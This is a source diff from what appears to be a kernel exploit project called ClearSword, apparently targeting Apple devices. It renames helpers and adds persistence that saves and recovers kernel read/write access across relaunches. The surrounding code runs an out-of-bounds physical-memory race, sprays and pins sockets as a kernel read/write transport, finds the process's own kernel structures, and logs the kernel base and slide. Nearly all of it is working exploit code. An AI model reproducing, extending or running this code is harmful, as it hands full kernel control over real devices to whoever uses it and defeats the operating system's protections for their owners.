@@ -11,6 +11,7 @@
 #include "free_thread.h"
 #include "kmem.h"
 #include "krw.h"
+#include "persistence.h"
 #include "phys_oob.h"
 #include "socket.h"
 #include "surface.h"
@@ -43,7 +44,7 @@ static bool g_pe_v3_hunt_budget_hit;
 static kern_return_t stop_early_krw(const char* reason) {
     LOG_ERR("%s", reason);
     bool parked = krw_park_transport();
-    bool pinned = parked && krw_sockets_leak_forever();
+    bool pinned = parked && cs_krw_sockets_leak_forever();
     g_ctx.transport_unsafe = true;
     if (parked && pinned) {
         LOG_ERR("KRW transport parked and pinned; reboot before retrying");
@@ -64,7 +65,7 @@ static void pe_stop_free_thread(void) {
 }
 
 static kern_return_t pe_init(void) {
-    init_target_file();
+    cs_init_target_file();
     if (g_ctx.read_fd < 0 || g_ctx.write_fd < 0) return KERN_FAILURE;
 
     uint32_t size = 0x1024;
@@ -119,7 +120,7 @@ static bool cycle_proven_pages(mach_port_t memory_object, const mach_vm_offset_t
     for (unsigned cycle = 0; cycle < PE_V3_PROVEN_CYCLES; cycle++) {
         (*cycles)++;
         LOG("pe_v3 reoccupation cycle %u/%u", cycle + 1, PE_V3_PROVEN_CYCLES);
-        sockets_release();
+        cs_sockets_release();
         *target_count = 0;
         sleep(PE_V3_SETTLE_SECONDS);
         if (g_ctx.race_failed) break;
@@ -168,7 +169,7 @@ static bool pe_v3(void) {
         goto cleanup;
     }
 
-    if (g_ctx.pc_object == MACH_PORT_NULL && initialize_physical_read_write(g_ctx.n_of_oob_pages * vm_page_size) != KERN_SUCCESS) {
+    if (g_ctx.pc_object == MACH_PORT_NULL && cs_initialize_physical_read_write(g_ctx.n_of_oob_pages * vm_page_size) != KERN_SUCCESS) {
         goto cleanup;
     }
 
@@ -194,7 +195,7 @@ static bool pe_v3(void) {
         wired_addrs[idx] = wired_addr;
         wired_count = idx + 1;
         if (!mlock_ceiling) {
-            if (surface_mlock(wired_addr, page_size) == KERN_SUCCESS) {
+            if (cs_surface_mlock(wired_addr, page_size) == KERN_SUCCESS) {
                 wired_successes++;
                 consecutive_mlock_failures = 0;
             } else if (++consecutive_mlock_failures >= PE_V3_MLOCK_FAILURE_LIMIT) {
@@ -216,10 +217,10 @@ static bool pe_v3(void) {
     for (mach_vm_size_t offset = 0; offset < search_size; offset += page_size) {
         *(uint64_t*)(search_mapping + offset) = g_ctx.random_marker;
     }
-    if (surface_mlock(search_mapping, search_size) != KERN_SUCCESS) {
+    if (cs_surface_mlock(search_mapping, search_size) != KERN_SUCCESS) {
         size_t released = surface_release_oldest(PE_V3_SEARCH_SURFACE_RESERVE);
         LOG("released %zu staging surfaces for the search mapping", released);
-        if (released == 0 || surface_mlock(search_mapping, search_size) != KERN_SUCCESS) {
+        if (released == 0 || cs_surface_mlock(search_mapping, search_size) != KERN_SUCCESS) {
             LOG_ERR("could not wire the search mapping");
             goto cleanup;
         }
@@ -234,7 +235,7 @@ static bool pe_v3(void) {
     if (spray_socket() == UINT64_MAX) {
         goto cleanup;
     }
-    sockets_release();
+    cs_sockets_release();
 
     size_t seen_count = 0;
     mach_vm_offset_t batch_offsets[PE_V3_BATCH_PAGES] = {};
@@ -341,8 +342,8 @@ cleanup:
     if (memory_object != MACH_PORT_NULL) {
         mach_port_deallocate(mach_task_self(), memory_object);
     }
-    if (!g_ctx.transport_unsafe) sockets_release();
-    if (search_surface_locked) surface_munlock(search_mapping);
+    if (!g_ctx.transport_unsafe) cs_sockets_release();
+    if (search_surface_locked) cs_surface_munlock(search_mapping);
     if (search_mapping != 0) {
         mach_vm_deallocate(mach_task_self(), search_mapping, search_size);
     }
@@ -350,7 +351,7 @@ cleanup:
         mach_vm_deallocate(mach_task_self(), wired_addrs[idx], page_size);
         if ((idx + 1) % PE_V3_DEALLOC_PACE == 0) usleep(1000);
     }
-    surface_munlock_all();
+    cs_surface_munlock_all();
     free(target_ids);
     free(seen_pages);
     free(wired_addrs);
@@ -368,8 +369,7 @@ static kern_return_t pe(agx_test_mode_t mode, uint64_t argument) {
     bool acquired = false;
     for (unsigned attempt = 0; attempt < PE_V3_LAYOUT_ATTEMPTS && !acquired && !g_ctx.race_failed; attempt++) {
         if (attempt != 0) {
-            LOG("pe_v3 re-rolling layout %u/%u%s", attempt + 1, PE_V3_LAYOUT_ATTEMPTS,
-                g_pe_v3_hunt_budget_hit ? " after foreign-read cap" : "");
+            LOG("pe_v3 re-rolling layout %u/%u%s", attempt + 1, PE_V3_LAYOUT_ATTEMPTS, g_pe_v3_hunt_budget_hit ? " after foreign-read cap" : "");
         }
         acquired = pe_v3();
     }
@@ -413,8 +413,11 @@ static kern_return_t pe(agx_test_mode_t mode, uint64_t argument) {
     g_ctx.self_task = self_task;
     g_ctx.self_pmap = self_pmap;
     LOG("self_proc=%#llx self_task=%#llx self_pmap=%#llx", self_proc, self_task, self_pmap);
-    if (!krw_sockets_leak_forever()) return stop_early_krw("could not pin KRW sockets");
+    if (!cs_krw_sockets_leak_forever()) return stop_early_krw("could not pin KRW sockets");
     g_ctx.transport_unsafe = true;
+    if (!clearsword_persistence_save()) {
+        LOG_ERR("continuing with live KRW; relaunch recovery is unavailable");
+    }
     LOG("AGX test mode=%s", agx_test_mode_name(mode));
     if (!agx_run_test(mode, argument)) {
         LOG_ERR("AGX %s test failed", agx_test_mode_name(mode));
@@ -445,15 +448,28 @@ int clearsword_run_test(agx_test_mode_t mode, uint64_t argument) {
     g_ctx.n_of_oob_pages = 2;
     g_ctx.oob_race_max_tries = 4000;
 
+    if (cs_offsets_init() != 0) goto failure;
+    g_ctx.offsets = g_offsets;
+    if (!agx_buffer_rw_self_test()) goto failure;
+    if (clearsword_persistence_recover()) {
+        LOG("AGX test mode=%s", agx_test_mode_name(mode));
+        if (!agx_run_test(mode, argument)) {
+            LOG_ERR("AGX %s test failed", agx_test_mode_name(mode));
+            return -1;
+        }
+        double elapsed_ms = (double)(mach_absolute_time() - start) * timebase.numer / timebase.denom / 1e6;
+        LOG("kernel_base: %#llx", g_ctx.kernel_base);
+        LOG("kernel_slide: %#llx", g_ctx.kernel_slide);
+        LOG("persisted KRW recovered in %.3f ms", elapsed_ms);
+        return 0;
+    }
+    LOG("no persisted KRW for this boot; starting ClearSword acquisition");
+
     arc4random_buf(&g_ctx.random_marker, sizeof(g_ctx.random_marker));
     arc4random_buf(&g_ctx.wired_page_marker, sizeof(g_ctx.wired_page_marker));
     g_ctx.default_file_content = calloc(1, g_ctx.target_file_size);
     if (!g_ctx.default_file_content) goto failure;
     memset_pattern8(g_ctx.default_file_content, &g_ctx.random_marker, g_ctx.target_file_size);
-
-    if (offsets_init() != 0) goto failure;
-    g_ctx.offsets = g_offsets;
-    if (!agx_buffer_rw_self_test()) goto failure;
     if (pe(mode, argument) != KERN_SUCCESS) goto failure;
 
     double elapsed_ms = (double)(mach_absolute_time() - start) * timebase.numer / timebase.denom / 1e6;
@@ -469,20 +485,12 @@ int clearsword_run_test(agx_test_mode_t mode, uint64_t argument) {
 failure:
     pe_stop_free_thread();
     physical_oob_cleanup();
-    surface_munlock_all();
-    if (!g_ctx.transport_unsafe) sockets_release();
+    cs_surface_munlock_all();
+    if (!g_ctx.transport_unsafe) cs_sockets_release();
     if (g_ctx.write_fd >= 0) close(g_ctx.write_fd);
     if (g_ctx.read_fd >= 0) close(g_ctx.read_fd);
     free(g_ctx.shared);
     free(g_ctx.default_file_content);
     free(g_ctx.executable_name);
     return g_ctx.transport_unsafe ? -2 : -1;
-}
-
-int clearsword_run(void) {
-    return clearsword_run_test(AGX_TEST_SHADOW, 0);
-}
-
-int clearsword_run_mode(agx_test_mode_t mode) {
-    return clearsword_run_test(mode, 0);
 }
